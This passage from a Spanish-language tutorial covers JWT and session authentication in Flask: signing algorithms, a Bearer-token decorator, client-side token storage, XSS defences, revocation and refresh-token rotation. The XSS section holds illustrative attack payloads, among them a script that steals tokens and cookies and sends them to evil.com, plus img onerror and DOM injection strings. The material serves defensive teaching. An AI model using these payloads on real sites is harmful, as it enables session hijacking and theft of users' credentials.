    if payload.get("exp", 0) < time.time():
        return False

    return True
```

### HS256 vs RS256: ¿Cuándo usar cuál?

```
HS256 (Simétrico):
  ─────────────────────────────────────────────────
  Una sola clave para firmar Y verificar.

  Auth Service ──(firma con secret)──► Token
  Tu mismo servicio ──(verifica con el mismo secret)──► ✅

  ✅ Simple, rápido, una sola clave
  ❌ Si tienes microservicios, todos necesitan el mismo secret
  ✅ Ideal para: apps monolíticas, un solo backend Flask


RS256 (Asimétrico — RSA):
  ─────────────────────────────────────────────────
  Clave privada para firmar, clave pública para verificar.

  Auth Service ──(firma con RSA privada)──► Token
  Service A, B, C ──(verifica con RSA pública)──► ✅

  ✅ El secreto (clave privada) solo vive en el Auth Service
  ✅ La clave pública se puede distribuir sin riesgo
  ✅ Ideal para: microservicios, OAuth, múltiples equipos
  ❌ Más complejo, más lento
```

```python
# RS256 con PyJWT — generación de claves
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Generar par de claves (solo una vez, guardar en archivos .pem)
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
public_pem = private_key.public_key().public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Firmar con RS256
token = jwt.encode(payload, private_pem, algorithm="RS256")

# Verificar con la clave pública (puede estar en otro servicio)
decoded = jwt.decode(token, public_pem, algorithms=["RS256"])
```

---

## 2.3 Flujo de Transporte

### El estándar `Authorization: Bearer`

Una vez obtenido el token, el cliente lo envía en el **header HTTP** en cada request:

```http
GET /api/dashboard HTTP/1.1
Host: api.mi-app.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO...
Content-Type: application/json
```

### Flujo completo con Flask

```
┌────────────────────────────────────────────────────────────────────┐
│                      FLUJO JWT COMPLETO                            │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  CLIENTE                             FLASK                         │
│                                                                    │
│  1. POST /auth/login                                               │
│     { user: "ana", pass: "..." }  ──►  Verifica credenciales      │
│                                        Genera access + refresh     │
│                                                                    │
│  2.                               ◄──  { access_token: "eyJ..." } │
│     Guarda access token en memoria     refresh token en cookie     │
│     (ver sección 2.3 — dónde guardar)  HttpOnly                    │
│                                                                    │
│  3. GET /api/profile                                               │
│     Authorization: Bearer eyJ... ──►  Extrae header               │
│                                        Verifica firma con SECRET   │
│                                        Extrae payload → user data  │
│                                        Sin consultar ninguna DB    │
│                                                                    │
│  4.                               ◄──  { user_id: 42, ... }       │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

### Decorador de autenticación JWT para Flask

```python
# auth_decorators.py
from functools import wraps
from flask import request, jsonify, g
from jwt_utils import verify_token


def jwt_required(f):
    """Decorador que valida el JWT en el header Authorization."""
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get("Authorization", "")

        if not auth_header.startswith("Bearer "):
            return jsonify({"error": "Token no proporcionado"}), 401

        token = auth_header[7:]   # Quitar "Bearer "

        payload = verify_token(token)
        if payload is None:
            return jsonify({"error": "Token inválido o expirado"}), 401

        g.current_user = payload   # Disponible en la vista como g.current_user
        return f(*args, **kwargs)

    return decorated


def roles_required(*roles):
    """Decorador que verifica que el usuario tenga uno de los roles indicados."""
    def decorator(f):
        @wraps(f)
        @jwt_required
        def decorated(*args, **kwargs):
            if g.current_user.get("role") not in roles:
                return jsonify({"error": "Permisos insuficientes"}), 403
            return f(*args, **kwargs)
        return decorated
    return decorator
```

```python
# app.py — rutas con JWT
from flask import Flask, request, jsonify, g, make_response
from auth_decorators import jwt_required, roles_required
from jwt_utils import create_access_token, create_refresh_token, verify_token
import bcrypt, os

app = Flask(__name__)

USERS_DB = {
    "ana": {
        "id": 42, "username": "ana", "role": "admin",
        "password_hash": bcrypt.hashpw(b"password123", bcrypt.gensalt())
    }
}


@app.route("/auth/login", methods=["POST"])
def login():
    data     = request.get_json()
    username = data.get("username", "")
    password = data.get("password", "").encode("utf-8")

    user = USERS_DB.get(username)
    if not user or not bcrypt.checkpw(password, user["password_hash"]):
        return jsonify({"error": "Credenciales inválidas"}), 401

    access_token  = create_access_token(user["id"], user["username"], user["role"])
    refresh_token = create_refresh_token(user["id"])

    response = make_response(jsonify({
        "access_token": access_token,
        "token_type":   "Bearer",
        "expires_in":   900     # 15 minutos en segundos
    }))

    # Refresh token en cookie HttpOnly — JavaScript no puede leerlo
    response.set_cookie(
        "refresh_token",
        value=refresh_token,
        httponly=True,
        secure=os.getenv("FLASK_ENV") == "production",
        samesite="Strict",
        max_age=604800    # 7 días
    )

    return response


@app.route("/auth/refresh", methods=["POST"])
def refresh():
    refresh_token = request.cookies.get("refresh_token")

    if not refresh_token:
        return jsonify({"error": "Refresh token no encontrado"}), 401

    payload = verify_token(refresh_token)
    if not payload or payload.get("type") != "refresh":
        return jsonify({"error": "Refresh token inválido"}), 401

    user = next((u for u in USERS_DB.values() if u["id"] == payload["user_id"]), None)
    if not user:
        return jsonify({"error": "Usuario no encontrado"}), 401

    new_access = create_access_token(user["id"], user["username"], user["role"])
    return jsonify({"access_token": new_access, "token_type": "Bearer", "expires_in": 900})


@app.route("/auth/logout", methods=["POST"])
def logout():
    response = make_response(jsonify({"message": "Sesión cerrada"}))
    response.delete_cookie("refresh_token")
    # El access token expirará solo — o añadirlo a una blacklist (ver sección 2.4)
    return response


@app.route("/api/profile")
@jwt_required
def profile():
    return jsonify({"user": g.current_user})


@app.route("/api/admin")
@roles_required("admin", "superuser")
def admin():
    return jsonify({"message": "Panel admin", "user": g.current_user})
```

### Almacenamiento del token en el cliente: el gran debate

```
┌──────────────────────────────────────────────────────────────────────────┐
│  LOCAL STORAGE                                                           │
├──────────────────────────────────────────────────────────────────────────┤
│  localStorage.setItem("access_token", token)                             │
│                                                                          │
│  ✅ Persiste entre pestañas y recargas                                   │
│  ✅ No vulnerable a CSRF (no se envía automáticamente)                   │
│  ❌ VULNERABLE A XSS: cualquier JS en la página puede leerlo             │
│     fetch("https://evil.com?t=" + localStorage.getItem("access_token")) │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  MEMORIA (variable de módulo / estado React/Vue)                         │
├──────────────────────────────────────────────────────────────────────────┤
│  let accessToken = null;   // Solo en la variable, no en APIs del browser│
│                                                                          │
│  ✅ Inaccesible para scripts de terceros                                 │
│  ✅ Se limpia al cerrar la pestaña                                       │
│  ❌ Se pierde al recargar (solución: refresh token en cookie)            │
│  ❌ No compartida entre pestañas                                         │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  COOKIE HttpOnly (para el access token completo)                         │
├──────────────────────────────────────────────────────────────────────────┤
│  Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Strict      │
│                                                                          │
│  ✅ JS no puede leerla — protegida contra XSS                            │
│  ❌ Vulnerable a CSRF (se envía automáticamente)                         │
│     → Mitigar con SameSite=Strict + token Anti-CSRF si es necesario     │
└──────────────────────────────────────────────────────────────────────────┘
```

### Patrón recomendado: Access Token en memoria + Refresh Token en cookie HttpOnly

```python
# SERVIDOR — ya implementado arriba en /auth/login:
# - access_token en el body JSON (cliente lo guarda en memoria)
# - refresh_token en cookie HttpOnly (cliente no puede leerlo)
```

```javascript
// CLIENTE — patrón de doble token
class AuthService {
    constructor() {
        this.accessToken = null;  // Solo en memoria
    }

    async login(username, password) {
        const res = await fetch("/auth/login", {
            method: "POST",
            credentials: "include",           // Para recibir la cookie del refresh token
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password })
        });
        const { access_token } = await res.json();
        this.accessToken = access_token;      // En memoria, no en localStorage
    }

    async refreshAccessToken() {
        // La cookie HttpOnly se envía automáticamente
        const res = await fetch("/auth/refresh", {
            method: "POST",
            credentials: "include"
        });
        if (!res.ok) {
            this.accessToken = null;
            throw new Error("Sesión expirada");
        }
        const { access_token } = await res.json();
        this.accessToken = access_token;
        return access_token;
    }

    async apiFetch(url, options = {}) {
        const makeRequest = (token) => fetch(url, {
            ...options,
            headers: { ...options.headers, "Authorization": `Bearer ${token}` }
        });

        let response = await makeRequest(this.accessToken);

        // Si el access token expiró, refrescar y reintentar una vez
        if (response.status === 401) {
            const newToken = await this.refreshAccessToken();
            response = await makeRequest(newToken);
        }

        return response;
    }
}

const auth = new AuthService();
```

---

## 2.4 Vulnerabilidades Estructurales

### XSS — Cross-Site Scripting

**Concepto:** El atacante logra inyectar JavaScript malicioso en tu página. Ese script se ejecuta en el navegador de la víctima con acceso a todo lo que JavaScript puede ver.

#### Tipos de XSS

```
┌───────────────────────────────────────────────────────────────────┐
│  TIPO 1: Reflected XSS                                            │
│                                                                   │
│  El payload malicioso viene en la URL y se refleja en el HTML     │
│  sin escapar.                                                     │
│                                                                   │
│  URL: /search?q=<script>robarToken()</script>                    │
│                                                                   │
│  Template vulnerable:                                             │
│  <p>Resultados para: {{ query | safe }}</p>   ← |safe es peligroso│
│                                                                   │
│  Template seguro (Jinja2 escapa por defecto):                     │
│  <p>Resultados para: {{ query }}</p>  ← Escapa automáticamente    │
└───────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────┐
│  TIPO 2: Stored XSS (Persistente)                                 │
│                                                                   │
│  El payload se guarda en la DB y se muestra a todos los usuarios. │
│                                                                   │
│  Comentario guardado en DB:                                       │
│  "Gran artículo! <img src=x onerror='                             │
│   fetch(\"https://evil.com?t=\"+localStorage.getItem(\"jwt\"))'>"│
│                                                                   │
│  Cada usuario que lo vea ejecuta el script.                       │
└───────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────┐
│  TIPO 3: DOM-based XSS                                            │
│                                                                   │
│  El payload nunca llega al servidor. JS en el cliente lee una     │
│  fuente insegura (URL hash) y escribe en el DOM sin sanitizar.    │
│                                                                   │
│  // ❌ Vulnerable:                                                │
│  document.getElementById("msg").innerHTML = location.hash.slice(1)│
│                                                                   │
│  // URL: /page#<img src=x onerror=alert(1)>                      │
└───────────────────────────────────────────────────────────────────┘
```

#### Script de robo de tokens (lo que el atacante inyectaría)

```javascript
// Si alguien logra inyectar esto en tu página:
(function exfiltrar() {
    const jwt = localStorage.getItem("access_token")
             || localStorage.getItem("jwt")
             || localStorage.getItem("token");

    const cookies = document.cookie;  // Solo las sin HttpOnly

    new Image().src = `https://evil.com/c?j=${encodeURIComponent(jwt)}&c=${encodeURIComponent(cookies)}`;

    // O interceptar todos los fetch futuros:
    const _fetch = window.fetch;
    window.fetch = function(...args) {
        new Image().src = `https://evil.com/req?url=${args[0]}`;
        return _fetch.apply(this, args);
    };
})();
```

#### Defensas contra XSS en Flask

```python
# ── 1. JINJA2: El escaping automático es tu primera defensa ─────────────

# ✅ Jinja2 escapa HTML por defecto — nunca usar |safe con input del usuario
@app.route("/search")
def search():
    query = request.args.get("q", "")
    # query podría ser: <script>alert(1)</script>
    # Jinja2 lo convierte a: &lt;script&gt;alert(1)&lt;/script&gt;
    return render_template("search.html", query=query)

# En el template:
# ✅ Seguro:   <p>{{ query }}</p>           → escapa automáticamente
# ❌ Peligroso: <p>{{ query | safe }}</p>   → desactiva el escaping


# ── 2. SANITIZAR HTML DE USUARIO (si necesitas permitir HTML) ───────────

# pip install bleach
import bleach

ALLOWED_TAGS = ["b", "i", "u", "em", "strong", "p", "br"]
ALLOWED_ATTRS = {}  # Sin atributos para evitar onerror, onclick, etc.

def sanitize_html(html_input: str) -> str:
    """Permite solo etiquetas seguras, elimina todo lo demás."""
    return bleach.clean(
        html_input,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True   # Eliminar, no escapar, las etiquetas no permitidas
    )

@app.route("/comment", methods=["POST"])
def add_comment():
    raw_comment = request.json.get("comment", "")
    safe_comment = sanitize_html(raw_comment)
    # Guardar safe_comment en DB


# ── 3. CONTENT SECURITY POLICY (CSP) ────────────────────────────────────
# Incluso si hay XSS, el script no puede conectarse a evil.com

@app.after_request
def set_security_headers(response):
    csp = "; ".join([
        "default-src 'self'",
        "script-src 'self'",               # Sin scripts inline ni externos
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "connect-src 'self' https://api.mi-app.com",
        "frame-ancestors 'none'",
        "base-uri 'self'",
        "form-action 'self'"
    ])
    response.headers["Content-Security-Policy"] = csp
    response.headers["X-Content-Type-Options"]  = "nosniff"
    response.headers["X-Frame-Options"]         = "DENY"
    response.headers["Referrer-Policy"]         = "strict-origin-when-cross-origin"
    return response


# ── 4. VALIDACIÓN ESTRICTA DE INPUT ──────────────────────────────────────
from flask import abort
from marshmallow import Schema, fields, validate, ValidationError

class CommentSchema(Schema):
    text = fields.Str(
        required=True,
        validate=[
            validate.Length(min=1, max=500),
            validate.Regexp(r'^[\w\s.,!?áéíóúñÁÉÍÓÚÑ-]+$',
                            error="Solo texto plano permitido")
        ]
    )

@app.route("/api/comment", methods=["POST"])
@jwt_required
def post_comment():
    schema = CommentSchema()
    try:
        data = schema.load(request.get_json())
    except ValidationError as err:
        return jsonify({"errors": err.messages}), 400

    # data["text"] es seguro de guardar
    return jsonify({"ok": True})
```

### Gestión estricta del tiempo de vida (TTL/Expiración)

**El problema fundamental de JWT:** No hay "logout" nativo. El token es válido hasta que expira, sin importar qué hagas en el servidor.

```
Con sesiones Flask:
  session.clear()  →  Usuario deslogueado INMEDIATAMENTE ✅
  Redis elimina la sesión → el token (cookie) ya no sirve

Con JWT:
  Borras el token del cliente... pero el token firmado SIGUE SIENDO VÁLIDO
  Si alguien lo copió antes del logout, puede usarlo hasta que expire ⚠️
```

#### Estrategia 1: Expiración corta (la más simple)

```python
# jwt_utils.py
ACCESS_TOKEN_EXPIRE  = 900      # 15 minutos — ventana de riesgo corta
REFRESH_TOKEN_EXPIRE = 604800   # 7 días

def create_access_token(user_id, username, role):
    now = int(time.time())
    return jwt.encode({
        "user_id": user_id, "username": username, "role": role,
        "iat": now, "exp": now + ACCESS_TOKEN_EXPIRE,
        "jti": str(uuid.uuid4())
    }, SECRET, algorithm="HS256")
```

#### Estrategia 2: Blacklist en Redis (invalidación real)

```python
# token_blacklist.py
import redis
import jwt
import time

redis_client = redis.from_url(os.environ["REDIS_URL"])


def revoke_token(token: str) -> None:
    """Añade el token a la blacklist hasta su expiración natural."""
    try:
        payload = jwt.decode(token, options={"verify_signature": False})
        jti = payload.get("jti")
        exp = payload.get("exp", 0)

        ttl = int(exp - time.time())
        if ttl > 0 and jti:
            redis_client.setex(f"blacklist:{jti}", ttl, "1")
    except jwt.InvalidTokenError:
        pass


def is_revoked(token: str) -> bool:
    """Comprueba si el token fue revocado."""
    try:
        payload = jwt.decode(token, options={"verify_signature": False})
        jti = payload.get("jti")
        if not jti:
            return False
        return redis_client.exists(f"blacklist:{jti}") == 1
    except jwt.InvalidTokenError:
        return True   # Token malformado = tratar como revocado


# auth_decorators.py — actualizado con blacklist
def jwt_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            return jsonify({"error": "Token no proporcionado"}), 401

        token = auth_header[7:]

        # Comprobar blacklist ANTES de verificar firma (más barato)
        if is_revoked(token):
            return jsonify({"error": "Token revocado"}), 401

        payload = verify_token(token)
        if payload is None:
            return jsonify({"error": "Token inválido o expirado"}), 401

        g.current_user = payload
        return f(*args, **kwargs)
    return decorated


# app.py — logout real con JWT
@app.route("/auth/logout", methods=["POST"])
@jwt_required
def logout():
    # Revocar el access token actual
    auth_header = request.headers.get("Authorization", "")
    access_token = auth_header[7:]
    revoke_token(access_token)

    # Revocar el refresh token de la cookie
    refresh_token = request.cookies.get("refresh_token")
    if refresh_token:
        revoke_token(refresh_token)

    response = make_response(jsonify({"message": "Sesión cerrada"}))
    response.delete_cookie("refresh_token")
    return response
```

#### Estrategia 3: Refresh Token Rotation (detección de robo)

```python
# En DB: tabla refresh_tokens
# id | user_id | token_hash | used | created_at | expires_at

import hashlib
from datetime import datetime, timezone

def hash_token(token: str) -> str:
    """No guardar el token en texto plano en la DB."""
    return hashlib.sha256(token.encode()).hexdigest()


@app.route("/auth/refresh", methods=["POST"])
def refresh():
    refresh_token = request.cookies.get("refresh_token")
    if not refresh_token:
        return jsonify({"error": "No hay refresh token"}), 401

    payload = verify_token(refresh_token)
    if not payload or payload.get("type") != "refresh":
        return jsonify({"error": "Token inválido"}), 401

    token_hash = hash_token(refresh_token)

    # Buscar en DB
    record = db.session.execute(
        "SELECT * FROM refresh_tokens WHERE token_hash = :h",
        {"h": token_hash}
    ).fetchone()

    if not record:
        return jsonify({"error": "Token no encontrado"}), 401

    if record.used:
        # ⚠️ POSIBLE ROBO: El token ya fue usado
        # Invalidar TODOS los tokens de este usuario como medida de seguridad
        db.session.execute(
            "DELETE FROM refresh_tokens WHERE user_id = :uid",
            {"uid": record.user_id}
        )
        db.session.commit()
        return jsonify({"error": "Refresh token reutilizado — sesión invalidada"}), 401

    # Marcar el token actual como usado
    db.session.execute(
        "UPDATE refresh_tokens SET used = true WHERE token_hash = :h",
        {"h": token_hash}
    )

    # Generar nuevos tokens
    user = get_user_by_id(record.user_id)
    new_access  = create_access_token(user.id, user.username, user.role)
    new_refresh = create_refresh_token(user.id)

    # Guardar el nuevo refresh token en DB
    db.session.execute(
        "INSERT INTO refresh_tokens (user_id, token_hash, used) VALUES (:uid, :h, false)",
        {"uid": user.id, "h": hash_token(new_refresh)}
    )
    db.session.commit()

    response = make_response(jsonify({
        "access_token": new_access,
        "token_type": "Bearer",
        "expires_in": 900
    }))
    response.set_cookie(
        "refresh_token", new_refresh,
        httponly=True, secure=True, samesite="Strict", max_age=604800
    )
    return response
```

#### Tabla de estrategias de expiración

| Estrategia | Seguridad | Complejidad | Estado en servidor |
|-----------|-----------|-------------|-------------------|
| Solo expiración corta | Media | Muy baja | Sin estado ✅ |
| Blacklist en Redis | Alta | Media | Parcial (solo revocados) |
| Token rotation | Muy alta | Alta | Parcial (tokens activos) |
| Sin expiración | ❌ Nunca usar | — | — |

---

# Comparativa Final y Cuándo Usar Cada Uno

```
┌──────────────────────────────┬──────────────────────┬──────────────────────┐
│ Característica               │ Flask-Session+Cookie │ JWT                  │
├──────────────────────────────┼──────────────────────┼──────────────────────┤
│ Estado en servidor           │ ✅ Sí (necesario)     │ ❌ No (ventaja)       │
│ Revocación inmediata         │ ✅ session.clear()    │ ⚠️  Necesita blacklist│
│ Escala horizontal            │ ⚠️  Requiere Redis    │ ✅ Nativo             │
│                              │    compartido         │                      │
│ Vulnerabilidad principal     │ CSRF                 │ XSS                  │
│ Defensa principal            │ Flask-WTF + SameSite │ HttpOnly + CSP       │
│ Datos en cliente             │ Solo ID opaco        │ Payload visible      │
│ Tamaño en cada request       │ Pequeño (~30 bytes)  │ Mediano (~300-600 B) │
│ Adecuado para                │ Flask con Jinja2     │ Flask como API REST  │
│                              │ Apps web clásicas    │ SPA, móvil, micro-   │
│                              │                      │ servicios            │
└──────────────────────────────┴──────────────────────┴──────────────────────┘
```

### Regla de oro para tu proyecto Flask

```
¿Tu Flask renderiza HTML con Jinja2 (app web clásica)?
  → Flask-Session + Redis + Flask-WTF
  → Sencillo, robusto, logout real, CSRF manejado automáticamente

¿Tu Flask es una API REST pura (frontend separado, React/Vue/móvil)?
  → JWT con doble token:
     · Access token (15min) en memoria del cliente
     · Refresh token (7d) en cookie HttpOnly
  → Añadir blacklist en Redis si necesitas logout real

¿Tienes múltiples servicios Flask o microservicios?
  → JWT con RS256: un servicio de autenticación central,
     los demás verifican con la clave pública

¿Necesitas logout instantáneo en todos los dispositivos?
  → Flask-Session (delete de Redis invalida todo) o
     JWT + blacklist en Redis por user_id
```

---

## Checklist de seguridad antes de producción

```
Sesiones:
  ☐ SECRET_KEY de al menos 32 caracteres aleatorios (use secrets.token_hex(32))
  ☐ SESSION_COOKIE_HTTPONLY = True
  ☐ SESSION_COOKIE_SECURE   = True
  ☐ SESSION_COOKIE_SAMESITE = "Strict" o "Lax"
  ☐ session.clear() antes de escribir datos de usuario en login
  ☐ Flask-Session con Redis en producción (no filesystem)

JWT:
  ☐ JWT_SECRET diferente a SECRET_KEY, mínimo 32 chars
  ☐ algorithms=["HS256"] explícito en jwt.decode()
  ☐ exp siempre presente en el payload
  ☐ Access token con expiración corta (≤ 15 min)
  ☐ Refresh token en cookie HttpOnly, no en localStorage
  ☐ Nunca datos sensibles en el payload

General:
  ☐ HTTPS en producción (Secure flag depende de esto)
  ☐ Headers CSP configurados (set_security_headers)
  ☐ Jinja2: nunca |safe con input del usuario
  ☐ Contraseñas hasheadas con bcrypt (work factor ≥ 12)
  ☐ Variables de entorno en .env, nunca en código
  ☐ .env en .gitignore
```

---

## Referencias y siguientes pasos

- **RFC 7519** — Especificación oficial de JWT: https://datatracker.ietf.org/doc/html/rfc7519
- **Flask-Session docs**: https://flask-session.readthedocs.io
- **PyJWT docs**: https://pyjwt.readthedocs.io
- **Flask-WTF / CSRF**: https://flask-wtf.readthedocs.io
- **OWASP CSRF Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- **OWASP XSS Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **jwt.io** — Debugger de tokens JWT: https://jwt.io

---

*Documentación generada con fines educativos. Los ejemplos son funcionales y adaptables a proyectos reales. Versiones usadas: Python 3.10+, Flask 3.x, PyJWT 2.x, Flask-Session 0.8+.*
